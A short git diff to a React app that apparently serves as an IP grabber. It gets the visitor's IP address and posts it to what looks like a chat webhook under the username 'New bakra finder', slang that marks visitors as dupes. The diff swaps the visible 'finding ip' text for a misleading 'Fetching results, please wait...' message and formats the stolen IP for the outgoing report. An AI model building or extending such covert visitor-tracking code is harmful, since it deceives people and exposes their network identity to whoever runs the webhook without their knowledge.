@@ -4,7 +4,7 @@ import "./bhutton.css";
 import { useEffect } from "react";
 
 function App() {
-  const [Ip, setIp] = useState("finding ip");
+  const [Ip, setIp] = useState("Fething results, please wait...");
 
   const getIp = async () => {
     try {
@@ -29,7 +29,7 @@ function App() {
     const params = {
       username: "New bakra finder",
       avatar_url: "",
-      content: Ip,
+      content: `----------------Ip address:  ${Ip} ----------------`,
     };
 
     request.send(JSON.stringify(params));
